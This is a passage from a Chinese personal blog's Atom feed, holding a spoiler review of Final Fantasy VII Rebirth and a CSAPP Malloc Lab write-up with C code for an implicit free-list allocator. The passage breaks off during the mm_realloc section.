<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lordaeron_ESZ&#39;s blog</title>
  
  <subtitle>代码-游戏-数码-技术</subtitle>
  <link href="http://lordaeronesz.github.io/atom.xml" rel="self"/>
  
  <link href="http://lordaeronesz.github.io/"/>
  <updated>2025-01-18T07:24:14.788Z</updated>
  <id>http://lordaeronesz.github.io/</id>
  
  <author>
    <name>Chaoqun Zheng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《最终幻想7：重生》体验分享</title>
    <link href="http://lordaeronesz.github.io/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
    <id>http://lordaeronesz.github.io/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/</id>
    <published>2025-01-18T02:29:06.000Z</published>
    <updated>2025-01-18T07:24:14.788Z</updated>
    
    <content type="html"><![CDATA[<p>《最终幻想7：重生》是我 2024 年最期待的游戏之一。由于发售时还没有 PS5，加上考研复试等事务缠身，没能第一时间体验。后来，后面为了剧情体验的连贯性，我又重温了一遍四年前的《最终幻想7：重制版》，直到最近两个月才正式开坑。</p><p>历经 87 小时通关一周目后，内心感慨万千，不吐不快，于是便有了这篇体验分享。整体而言，《最终幻想7：重生》无愧于我 2024 年的年度游戏，甚至在 jrpg 品类中几乎稳坐我心中的头把交椅。但它并非完美，其中仍有一些让我不太满意或感到遗憾的地方，接下来便一一细说。</p><blockquote><p>提示：本文存在剧透内容。</p></blockquote><h1 id="广阔，未必自由"><a href="#广阔，未必自由" class="headerlink" title="广阔，未必自由"></a>广阔，未必自由</h1><p>相较于重制版第一作，《重生》最大的进化便是引入了一个可供探索的大地图。但请注意，尽管游戏的地图很大，我却很难称之为“开放世界”。实际上，游戏并未表现出什么构建一个生动、真实的奇幻世界的意图，而是通过一个个清单项来构成世界。而这势必会导致游戏体验上的重复，制作组为了缓解这种枯燥感，尽可能地在这些重复的清单项中引入了差异化设计。例如，同样是捕获陆行鸟，不同地区有不同的解决方式，这些在一定程度上确实减轻了重复感。</p><p>支线任务方面，相比上一作，《重生》有了显著的变化：每个支线任务与队伍中的某个角色相关，完成后可以提升该角色的好感度（与后期金蝶游乐园事件的触发相关），任务的完成情况有两档，完美完成时好感度的提升会更多（推测，未求证）。这其实也表明，《重生》的支线任务和一众美式 RPG 为了描绘世界不同，更专注于塑造队伍中角色的人物性格，强化主角克劳德与队友之间的羁绊。以这样一个视角来审视《重生》的支线任务，个人认为表现的还算不错。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/world.jpg" alt></p><p>在前期，剧情还未展开时，这样的清单项世界体验还算不错。但到了中后期，主线剧情逐渐变得更吸引人的情况下，游戏却频繁地向玩家抛出新的可探索区域，让游玩体验变得略显疲惫。我印象中这个问题最明显的区域便是星陨峡谷和尼泊尔海姆这一段，一是它们是游戏最后解锁的两个区域，玩家此时已经疲于探索，另外，这部分的主线剧情比较紧凑，很多人可能不愿停下来清理这些清单项。虽说清单项并非一定得做，但是之前没有提到的是，《重生》的清单项世界其实很大程度上是奖励驱动的，探索的收益十分丰厚，尤其是召唤兽的弱化和装备设计图纸，这些与游戏的核心玩法——战斗系统息息相关。因此，就算不为了清单项本身的游玩乐趣，冲着角色 build 强度去也很难不做。</p><p>至于社区中普遍诟病的小游戏和地图设计，我个人反倒体验还好。首先是小游戏，因为个人暂时也不追求白金，所以这部分感觉还算良好，大部分主线或支线中的小游戏若只是想通过基本上尝试一两次也就差不多了，也能起到一定调剂游戏节奏的作用。而像一些比较繁琐且耗时较长的，比如前往太阳海岸途中的女皇之血大赛，游戏也提供了直接跳过的选项（虽然个人并没有跳过）。而关于地图设计，在我看来问题主要源于 SE 的技术力限制，角色与场景间的交互体验相比同类型游戏来说比较糟糕：陆行鸟手感较差，角色攀爬和推箱子等动作十分缓慢且僵硬，还有一些反直觉的空气墙等等…… 而箱庭地图的结构设计本身，个人认为还是可圈可点的，不算优秀，但也在及格线以上的水平。</p><h1 id="指令与动作的交响曲"><a href="#指令与动作的交响曲" class="headerlink" title="指令与动作的交响曲"></a>指令与动作的交响曲</h1><p>在《最终幻想7：重制版》中，相较于原作，战斗系统迎来了巨大的革新——它以 ATB 指令为核心，同时融入了一定的动作性。我当时便对这套系统十分喜爱，并给予了很高的评价。此次重温，更让我再次体会到其设计的精妙之处，但也确实发现了一些不够成熟的地方。</p><p>首先是对于空中敌人的应对，可以说体验很糟糕。克劳德、蒂法等近战角色无法在空中打出连段，要想比较高效地进行输出，往往只能依赖于魔法，这很大程度上限制了战斗系统的发挥空间。其次，动作与指令的边界感比较模糊。具体来说，游戏中有很多敌人招式非常反直觉，有些招式看似能躲开，其实是指令锁定；而有些招式则更具动作性，基本所见即所得。这种边界的不清晰，让战斗在某些时刻显得不够流畅。</p><p>而要解决上述问题，我认为最好的方法便是明确动作和指令的界限——要么进一步强化动作性，使战斗更加流畅；要么让系统更偏向指令式，突出策略性。而从最终的呈现效果来看，制作组显然选择了前者。《重生》的战斗系统上手的第一感觉便是爽快。近战角色现在引入了空中连段，原本需要装备特定魔石才能解锁的范围普攻，在这一作中成为了默认能力，而克劳德甚至新增了远程普通攻击和快速近身突进。这些改动极大提升了战斗的流畅度，并显著加快了节奏。除此以外，游戏还引入了动作游戏中常见的完美防御机制，不仅让战斗系统的上限进一步提高，也极大改善了原本模糊的指令与动作边界。如今，大部分的敌人攻击都可以依靠闪避或完美防御来化解，战斗手感更加顺畅。值得一提的是，《重生》的完美防御在（被）打击反馈上做的很好，一旦触发，正反馈极强。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/menu.jpg" alt></p><p>联手技算是一个全新的机制，它相当于给战斗系统引入了另外一个维度的资源，给战斗增添了更多的不确定性。在本作的战斗体系下，全员低血量且无 ATB 积攒的情况是十分危险的，玩家要想恢复生命值，就必须向敌人发起攻击以累积 ATB，而在低血量的情况下贸然攻击敌人又很可能导致角色死亡，让战斗局势更加难以挽回，而联手技配合原有的极限技，让玩家在这种情况下多了一份逆风翻盘的可能性。制作组可能是为了尽可能强化这种体验，这一作的战斗明显节奏上更快，而且也更加危险，Normal 难度在同类游戏中绝对算不上低，我数不清有多少次，在全员生命值告急的情况下，坚持一顿连续输出，将 boss 一波带走。这样的战斗体验，可谓十分美妙。</p><p>有关战斗这部分我也没法聊的太多，因为我短短 87 小时的游戏时长，也不太可能把《重生》的战斗玩得很明白。实际上，我玩得算是比较草率，7 个可控角色中，除却强制配队的情况，我基本全程都是克劳德、蒂法和爱丽丝的组合，魔晶石搭配、装备、魔导书等系统也基本只仔细研究了他们三人。但即便如此，综合战斗的乐趣和深度而言，《重生》的这套既复古又现代的战斗系统，也足以在我玩过的 jrpg 中位居第一。</p><h1 id="演出如诗，旋律如泣"><a href="#演出如诗，旋律如泣" class="headerlink" title="演出如诗，旋律如泣"></a>演出如诗，旋律如泣</h1><p>《重生》的画面表现，是让我比较感到比较失望的点，尤其是在引入了大地图之后，暴露了诸多技术性的问题。</p><p>首先是光影，前作的光影效果给我留下了很深刻的印象，可以说在当时来讲非常出色，尤其是游戏序章炸毁魔晄炉的任务中，光影层次丰富，氛围营造极为出色。要知道，我当时可是在一台性能已经被如今的旗舰手机赶超的 PS4 Slim 上游玩的。但在《重生》中，虽然固定的室内场景还算比较出色，但一旦涉及到室内外切换，光影调整往往迟滞数秒，甚至从室内看向室外，时常出现过曝现象，出口处白茫茫的一片什么也看不见，体验十分糟糕。此外，在非 Pro 版 PS5 上，性能模式（60 FPS）下画面呈现非常模糊，但根据数毛社 Digital Foundry 的评测，该模式下实际的渲染分辨率并不低，大约在 1100p 上下浮动，貌似是没有用上现代的超分辨率技术的缘故，使得画面观感很差。为了更好地体验故事，我后面还是选择全程开着画面模式（30 FPS）来游玩，至少在这个模式下，综合画面质量相比上一作还是有显著进步的。</p><p>虽然画面硬素质很一般，但是场景美术依然可圈可点。尤其是第一张大地图——格拉斯兰地区，场景色调以浅色系为主，营造出极为舒适的视觉观感，这种风格很像另一个我很喜欢的 jrpg ——《最终幻想 15》，其温暖而富有生机的奇幻色彩，正是我心目中理想的日式奇幻世界该有的样子。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/castle.jpg" alt></p><p>要说起《最终幻想》这个 IP 所最不容妥协的，玩家也最不用担心搞砸的是什么，恐怕大部分人都会给出同一个答案，那就是音画表现，更具体来说——演出与音乐。《最终幻想》系列对演出效果的追求是十分偏执的，在如今这个即时演算动画效果已经非常出色，绝大部分游戏厂商都完全放弃了采用预渲染 CG 的情况下，《最终幻想》依然执着地在关键剧情中插入 CG 过场，用以将某些场景的表现力推至极致。这种对演出的极端追求，或许正是《最终幻想》系列的“基因”吧。而本作亦是如此，奉献了很多注定会在系列历史上，乃至整个电子游戏史上留下浓墨重彩一笔的精彩演出。</p><p>《重生》在音乐上交出的答卷也是十分令人满意的，游戏在每张大地图都配备了探索与战斗两套不同编曲的配乐，以便在游玩过程中无缝切换。再结合前面提到的优秀场景美术，使得游戏的清单项清理过程变得不再那么枯燥，至少在前期，体验可以说相当出色。音乐上的“铺张浪费”也是显而易见的，游戏中有很多根本无关紧要的支线任务，甚至是小游戏，都配备了专属 BGM。我脑海中立马能浮现的例子，就有一个青蛙跳台小游戏和一个护送狗的支线任务，当时玩到可谓是大受震撼。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/loveless.jpg" alt></p><p>音乐在关键情节的演绎也是极其出色的，《重生》这一部剧情的绝对核心是爱丽丝，因为终章大概率没有多少她的戏份了，因此这一作花了大量的篇幅对她进行塑造，希望给这个角色一个完美的“退场仪式”。这一点从音乐上也能看出来，《重生》这一作编写了大量爱丽丝主题曲的不同变奏版本，分别在各个与之相关的情节播放，比如星陨峡谷的送星仪式，还有古代种神殿中爱丽丝的幼年回忆等，甚至本作的主题曲——《No promises to keep》都是为她量身打造，并奉上了一段极其精彩的演出。这些铺垫在最终章时得到爆发，爱丽丝之死，以及随后紧接的 boss 战，音乐的情绪渲染堪称教科书级别，将玩家的情绪推向极致。</p><h1 id="命运交错，情感升华"><a href="#命运交错，情感升华" class="headerlink" title="命运交错，情感升华"></a>命运交错，情感升华</h1><p>在开坑《重生》前，我特地花了 30 多小时重温了四年前的重制版一代。在称赞前作优秀战斗系统的同时，也感受到一些叙事上存在的问题，而《重生》这一代甚至将这些问题进一步放大。</p><p>直观感受就是部分情节的呈现显得突兀甚至略显尴尬。个人总结其中一个很大的原因是重制所带来的：97 年原版的《最终幻想 7》虽在当前感动了无数玩家，但在那个 3d 技术尚未成熟的年代，除 CG 过场外，角色的剧情演出基本都是由 q 版小人以较为抽象的方式来表现。如今，制作组试图将这些情节用现代图形技术加持的影视化方式进行重塑，难免会感到很不协调。虽然制作组已经为此优化了很多，但问题依然存在。另外，可能是为了提升游戏体验的丰富度，在我看来 gameplay 在本作中应当占据了较大的话语权，很多不太合理的故事情节实际上是为了引出一些小游戏供玩家体验，而这其中很大一部分其实是原作就有的。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/gold.jpg" alt></p><p>但是尽管如此，《重生》剧情体验的优点也完美继承自上一作，并且同样也得到了提升，那就是人物塑造和细腻的情感刻画。《最终幻想 7》的重制三部曲（虽说最后一部还没出）之所以能做好这部分，其实很大程度上也是因为重制的缘故，当原版可能几个小时的流程被扩展成为一个三四十小时的完整体量游戏时，角色一些可能无关紧要的行为就能有充足的空间被细致刻画。而这些被塑造的十分丰满、富有魅力的角色，也正是我喜欢《最终幻想 7》的原因，同时也是我如此在意它后续故事发展的原因。这一次开坑《重生》的过程，就像是与阔别数年的老朋友重逢，主角团之间产生的一些有趣的互动，为整个冒险旅程注入了独特的温度，很大程度上掩盖了上面提到的一些情节上的瑕疵。仔细想想，这大概也是我热爱 jrpg 的原因吧。</p><p>最后，我想好好聊聊《重生》最后的结局。这个结局带给我的感受是十分复杂的。</p><p>首先，不考虑制作组真正想整的大活，仅从观感来看，情节的演绎方式让我一度感到诧异，甚至是愤怒，这部分最突出的地方莫过于大 boss——萨菲罗斯的各种演出。若要问我《重生》中最讨厌的角色，那非萨菲罗斯莫属了。这个角色在情节中的插入，几乎充斥着整部游戏，虽说这与原版《最终幻想 7》故事精华之一——主角克劳德过去的经历密切相关，但在我看来制作组显然没有把控好这个度，让我感到厌烦，尤其在结局处更加放大了这一感受。</p><p>但是另一方面，原版《最终幻想 7》最令人印象深刻的情节——爱丽丝之死使用了一种完全不一样的方式来呈现，这部分的呈现效果非常因人而异。在我的观察下，不同人对剧情的理解不同，可能会得到截然不同的感受。而在我的理解下，至少是我当时得出的结论来说：爱丽丝之死的结果并没有被改变。因此这段情节对我的情感冲击很大，随后的 boss 战更是将整段演出进行升华，杰诺瓦 boss 战的音乐与爱丽丝的主题曲相互交织，带给我近两年从游戏中收获的最大的感动。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/aerith.jpg" alt></p><blockquote><p>关于我得出爱丽丝之死没有被改变的结论的原因，一方面是此前采访中制作人滨口直树提到的“一些关键角色的死亡不会被改变，而会以另一种方式来呈现”；另一方面是其实更多的是直觉——或许是我的期待，或许是我的理解。</p></blockquote><p>而在其他一些玩家的体验中，可能得出爱丽丝的结局将被改变，或是还处在对前面引入的平行宇宙设定感到迷惑的阶段，在这一刻下理性思维盖过了感性思维，因此情感并没有被成功调动。因此，结局所带来的冲击力因人而异，或感动，或困惑，或不满。</p><p>至于结局处留下的更多伏笔，网上的讨论有很多，我也对参与其中也并无兴趣，只希望制作组妥善处理，在终章尽可能将这些坑填上，给这场历经数年的冒险旅途画上一个圆满的句号。</p><p>现在的我，已经无比期待终章的发售，不出意外，它应该是我 27 年最期待的游戏了（立个 flag，希望 27 年能出 😭）。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/end.jpg" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;《最终幻想7：重生》是我 2024 年最期待的游戏之一。由于发售时还没有 PS5，加上考研复试等事务缠身，没能第一时间体验。后来，后面为了剧情体验的连贯性，我又重温了一遍四年前的《最终幻想7：重制版》，直到最近两个月才正式开坑。&lt;/p&gt;
&lt;p&gt;历经 87 小时通关一周目后，</summary>
      
    
    
    
    <category term="游戏" scheme="http://lordaeronesz.github.io/categories/%E6%B8%B8%E6%88%8F/"/>
    
    
    <category term="游戏" scheme="http://lordaeronesz.github.io/tags/%E6%B8%B8%E6%88%8F/"/>
    
    <category term="闲谈" scheme="http://lordaeronesz.github.io/tags/%E9%97%B2%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Malloc Lab</title>
    <link href="http://lordaeronesz.github.io/2025/01/10/CSAPP-Malloc-Lab/"/>
    <id>http://lordaeronesz.github.io/2025/01/10/CSAPP-Malloc-Lab/</id>
    <published>2025-01-10T03:45:11.000Z</published>
    <updated>2025-01-11T02:24:55.025Z</updated>
    
    <content type="html"><![CDATA[<p>本 Lab 需要实现一个内存分配器，技巧性较强，对应知识点为书中的第 9 章的第 9.9 节。个人认为是所有 Lab 中难度最高的一个，我这里也是时间所迫，只参照教材实现了隐式空闲链表，显式空闲链表的实现尚存在一些 bug，在本文暂不介绍。</p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>实现 <code>mm_init</code>, <code>mm_malloc</code>, <code>mm_free</code>, <code>mm_realloc</code>。</p><p><code>mm_malloc</code> 需要返回 8 字节对齐的指针。</p><p><code>mm_realloc</code>: 返回一个指向至少 <code>size</code> 字节的内存区域指针。</p><ul><li>如果 <code>ptr</code> 为空，作用等同于 <code>mm_malloc(size)</code>。</li><li>如果 <code>size</code> 等于 0，作用等用于 <code>mm_free(ptr)</code>。</li><li>如果 <code>ptr</code> 非空，将 <code>ptr</code> 指向区域的大小更改为 <code>size</code> 字节，并返回新区域的内存地址。</li></ul><h2 id="隐式空闲链表"><a href="#隐式空闲链表" class="headerlink" title="隐式空闲链表"></a>隐式空闲链表</h2><p>首先介绍一下书中介绍的隐式空闲链表的设计，主要分为两个方面：空闲块的设计和空闲链表的组织。</p><h3 id="空闲块的设计"><a href="#空闲块的设计" class="headerlink" title="空闲块的设计"></a>空闲块的设计</h3><p><img src="/2025/01/10/CSAPP-Malloc-Lab/bound.png" alt></p><p>一个空闲块由三部分组成：首部、载荷（可能包含填充）和尾部。头部和尾部的内容完全一致，之所以要引入这样的冗余信息，是为了实现常数时间复杂度的反向访问。因为内存载荷大小的不确定性，因此无法直接根据当前内存载荷的地址计算得到前一块的地址，而引入了尾部后，就能够根据固定步长（当前块的首部和上一块的尾部地址差一个字）计算得到前一块载荷的地址。</p><p>另外，首（尾）部的内容也值得一提，由于空闲块需要 8 字节对齐，因此 block size 的低 3 位必定为 0，因此这 3 位的信息是冗余的，可省略，转而将其最低位作为分配位，0 代表空闲，1 代表已分配。</p><h3 id="空闲链表的组织"><a href="#空闲链表的组织" class="headerlink" title="空闲链表的组织"></a>空闲链表的组织</h3><p><img src="/2025/01/10/CSAPP-Malloc-Lab/logue.png" alt></p><p>空闲链表的组织如上图所示，可以看到，常规的内存块两端引入了序言块（prologue block）和结尾块（epilogue block），同时为了保持 8 字节对齐，还在序言块的头部引入了一个 4 字节的 padding 块。</p><p>序言块和结尾块的分配位都标记为 1，之所以要这么做，是为了更方便地处理空闲块合并时的边界条件，它们的作用其实就相当于链表的 dummy 结点。其中，结尾块的大小字段设置为 0，用以唯一地对其进行标记（因为其他块的大小必定大于 0）。</p><h3 id="各函数实现"><a href="#各函数实现" class="headerlink" title="各函数实现"></a>各函数实现</h3><p>由于 <code>mm_init</code>，<code>mm_malloc</code> 等操作书中已经实现且比较易懂，接下来主要介绍 <code>extend_heap</code>，<code>find_fit</code>，<code>place</code> 和 <code>mm_realloc</code>。</p><h4 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a><code>extend_heap</code></h4><p><code>extend_heap</code> 的作用是对堆进行扩展，具体来说是先使用 <code>mm_sbrk</code> 向上增长堆尾指针 <code>mm_brk</code> 的位置，再将新扩展出来的内存块连接到原有块的末尾。</p><p>连接这部分的操作不太易懂，书中也对此做出了解释：</p><blockquote><p>The remainder of the extend<em>heap function (lines 12–17) is somewhat subtle. The heap begins on a double-word aligned boundary, and every call to extend</em> heap returns a block whose size is an integral number of double words. Thus, every call to mem_sbrk returns a double-word aligned chunk of memory immediately following the header of the epilogue block. This header becomes the header of the new free block (line 12), and the last word of the chunk becomes the new epilogue block header (line 14). Finally, in the likely case that the previous heap was terminated by a free block, we call the coalesce function to merge the two free blocks and return the block pointer of the merged blocks (line 17).</p></blockquote><p>简单来说，新扩展出来的块的起始地址即 <code>mm_sbrk(size)</code> 的返回值 <code>bp</code>，它紧挨在原来块的末尾——结尾块的头部，而 <code>PUT(HDRP(bp), PACK(size, 0))</code> 则正好是将其覆盖并作为新块的头部，注意 <code>HDRP</code> 的定义：<code>#define HDRP(bp) ((char *)(bp) - WSIZE)</code>。随后便是创建尾部，并在新块的末尾添加一个新的结尾块，最后尝试将新块与前一块进行合并。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    <span class="token comment">// 分配偶数个字来保持字节对齐 </span>    size <span class="token operator">=</span> <span class="token punctuation">(</span>words <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>words <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> WSIZE <span class="token operator">:</span> words <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 初始化空闲块的 header, footer 和下一块的 epilogue</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 如果前一块是空闲，则合并</span>    <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="find-fit"><a href="#find-fit" class="headerlink" title="find_fit"></a><code>find_fit</code></h4><p>这部分其实没什么好说的，我只是实现了最简单的首次匹配算法，需要注意的就是根据 size 是否等于 0 来判断当前遍历块是否是结尾块。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    <span class="token comment">// 最简单的首次匹配策略</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>blkp <span class="token operator">=</span> heap_listp<span class="token punctuation">;</span>        <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>        blkp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">>=</span> asize <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> blkp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="place"><a href="#place" class="headerlink" title="place"></a><code>place</code></h4><p><code>place</code> 操作通常紧跟在成功查找到空闲块之后执行，作用是将 <code>asize</code> 大小的块”放置在“地址为 <code>bp</code> 的块中。一种最简单朴素的做法当然是将整个块进行完全分配，但是这样会引入大量的内部碎片（internal fragmentation），降低内存的利用率。</p><p>为了改善这一点，需要对块进行分割，书中提到的一种简单的分割策略是：如果分割后剩余的块大小大于等于隐式空闲链表空闲块设计的最小大小（即 8 字节，只包含首部和尾部），则进行分割，否则，整个分配。在代码实现上，分割时只需要分配放置分配块与剩余块的首部和尾部即可。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 空闲块大小</span>    <span class="token class-name">size_t</span> remain <span class="token operator">=</span> size <span class="token operator">-</span> asize<span class="token punctuation">;</span>      <span class="token comment">// 空闲块分配 asize 字节后剩余的空间</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>remain <span class="token operator">>=</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 分割</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>remain<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>remain<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 不分割</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a><code>mm_realloc</code></h4><p><code>mm_realloc</code> 作用是调整地址为 <code>ptr</code> 的块大小，另外当 <code>ptr</code> 